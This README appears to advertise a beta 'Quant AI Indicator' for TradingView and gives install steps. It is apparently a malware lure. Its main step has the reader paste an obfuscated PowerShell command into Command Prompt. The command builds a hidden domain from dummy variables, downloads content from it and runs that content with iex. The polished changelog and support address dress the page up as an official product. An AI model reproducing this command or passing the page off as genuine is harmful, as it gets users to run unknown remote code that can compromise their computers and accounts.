<a id="get"></a>
<div align="center">
<p align="center">
  <img src="logo.png" alt="TradingView" width="580">
</p>

## Quant AI Indicator

</div>

The first AI-powered indicator in our library. Quant analyzes live market data and changing conditions to model several ways a setup may develop over the selected timeframe. Early beta access is currently available through GitHub ahead of the full in-app release.

## Installation

Follow the steps below to install the Quant Indicator and its required dependencies using Command Prompt.

### 1. Open Command Prompt.

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

### 2. Install Quant Indicator.

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library'; $Install; $Pinescript='TradingView'+$Sync+'.AI'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
```

Press **Enter** to begin the installation.

### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.





## Support

Quant is currently being tested ahead of its full in-app release.

If you encounter an issue or would like to share feedback, contact us at [support@tradingview.com](mailto:support@tradingview.com).

Your feedback helps us improve stability, model behavior, and chart integration throughout the beta.


## Changelog

### v2.9.5-beta

- Refined market-data processing across price action, liquidity, positioning, volatility, and market structure.
- Improved indicator recalculation as new market data becomes available.
- Updated how changing market conditions are reflected across different timeframes.
- Expanded support for scheduled market events and upcoming catalysts.
- Improved event relevance based on symbol, timeframe, and event timing.
- Reduced latency between incoming data and chart updates.
- Improved handling of fast-changing volatility and market conditions.
- Added additional checks for incomplete or inconsistent data.
- Improved calculation stability when switching between symbols and timeframes.
- Refined how market context and supporting data are displayed on the chart.
- Improved synchronization between live data updates and indicator calculations.
- Reduced unnecessary changes during periods of market noise.
- Optimized calculation performance and update speed.
- Improved recovery from temporary data-feed interruptions.
- Fixed several chart refresh and synchronization issues reported during beta testing.
- Improved overall stability across different symbols and timeframes.
- Continued tuning of the model to better adapt to changing market structure.
- Expanded beta testing across additional markets, timeframes, and trading conditions.
